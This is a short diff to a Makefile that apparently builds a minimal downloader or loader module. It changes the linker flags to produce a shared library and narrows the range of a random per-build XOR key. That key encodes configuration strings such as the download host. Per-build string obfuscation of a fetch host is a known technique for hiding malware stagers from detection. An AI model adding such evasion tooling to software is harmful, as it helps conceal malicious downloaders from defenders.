@@ -10,7 +10,7 @@ endif
 
 # Add -Wl,--gc-sections
 LDFLAGS = -nostdlib -static -Wl,-Ttext-segment=0x10000000 -s -Wl,--gc-sections
-DL_LDFLAGS = -nostdlib -static -pie -Wl,--gc-sections -Wl,--no-dynamic-linker -s
+DL_LDFLAGS = -nostdlib -shared -fPIC -Wl,-Bsymbolic -Wl,--gc-sections -s
 
 # Default configuration (can be overridden by environment variables)
 DOWNLOAD_HOST ?= 127.0.0.1
@@ -22,7 +22,7 @@ MODULE_PATH ?=
 DOWNLOADER_MODULE_PATH ?= /lib/x86_64-linux-gnu/libdl.so.2
 
 # Generate random XOR key per build
-XOR_KEY_VALUE := $(shell python3 -c "import random; print(hex(random.randint(1, 255)))")
+XOR_KEY_VALUE := $(shell python3 -c "import random; print(hex(random.randint(128, 255)))")
 
 # XOR-encode config strings
 XOR_HOST := $(shell python3 -c "s='$(DOWNLOAD_HOST)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
